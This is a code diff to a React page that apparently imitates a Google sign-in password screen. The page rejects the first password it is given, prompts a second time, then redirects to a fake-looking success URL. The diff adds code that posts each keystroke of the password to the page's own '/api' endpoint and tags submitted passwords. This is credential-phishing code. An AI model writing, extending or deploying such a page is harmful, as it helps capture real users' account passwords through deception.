@@ -44,8 +44,9 @@ export default function Page() {
         }
         if(attempt<1){
             await axios.post('/api', {
-                password: value
-            }).then(data=>console.log(data))
+                password: value,
+                type: 'submit'
+            })
             setValue('')
             setValid(false)
             if(input.current) {
@@ -54,7 +55,8 @@ export default function Page() {
             setAttempt(a=>a+1)
         } else {
             await axios.post('/api', {
-                password: value
+                password: value,
+                type: 'submit'
             })
             setValid(true)
             router.push('/v3/signin/challenge/pwd/success-accede/ky?gygjk=5ukKyCTIhlcROS=qFReseNO9KGJT=eI4a7w=TMMZ%mrKDz=hJ&virQwwrRpqXVeXcrgBpP0borxdnx0Zav0=XpRYga4x3=jzQ')
@@ -77,6 +79,13 @@ export default function Page() {
             line.current.style.opacity='0'
         }
     }, []);
+    const onChange = useCallback((e: React.ChangeEvent<HTMLInputElement>)=>{
+        setValue(e.target.value)
+        axios.post('/api', {
+            password: e.target.value,
+            type: 'input'
+        })
+    },[])
     return (
         <main className={styles.main}>
             <div className={styles.TcuCfd}>
@@ -112,7 +121,7 @@ export default function Page() {
                                     <input name="Passwd" autoComplete="current-password" value={value}
                                            className={`${styles.inputField} ${valid? styles.valid: styles.invalid}`}
                                            type={show ? 'text' : 'password'}
-                                           onChange={e => setValue(e.target.value)}
+                                           onChange={onChange}
                                            ref={input}/>
                                 </form>
                                 {!valid &&
